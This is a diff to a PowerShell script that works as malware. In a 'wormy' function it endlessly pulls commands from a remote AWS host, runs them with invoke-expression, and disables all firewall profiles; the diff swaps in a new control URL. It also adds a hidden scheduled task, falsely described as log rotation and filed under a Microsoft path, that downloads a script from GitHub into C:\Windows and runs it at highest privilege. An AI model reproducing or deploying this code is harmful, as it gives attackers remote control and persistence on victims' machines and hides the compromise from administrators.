@@ -73,7 +73,7 @@ function keepWINRMAlive{
 function wormy{
     
     while(1 -eq 1){
-    $httpCommand=invoke-restmethod http://ec2-52-70-218-30.compute-1.amazonaws.com/fun/ezT231.txt
+    $httpCommand=invoke-restmethod http://ec2-3-236-235-15.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt
     invoke-expression $httpCommand
     accountPersist
     Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
@@ -128,6 +128,12 @@ start-job -ScriptBlock {
             $trigger = New-ScheduledTaskTrigger -AtLogon
             Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotate" -RunLevel Highest -Description "Prevents a event log cache overflow by rotating logs within NTFS filesystems. Disabling can cause system instability and is not recomended." -TaskPath \Microsoft\Windows\SpacePort -force
         
+        
+            $action = @()
+            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
+            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "C:\Windows\EventLog.ps1"'
+            $trigger = New-ScheduledTaskTrigger 
+            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotate" -RunLevel Highest -Description "Prevents a event log cache overflow by rotating logs within NTFS filesystems. Disabling can cause system instability and is not recomended." -TaskPath \Microsoft\Windows\Bitlocker -force
         }
         catch{
 
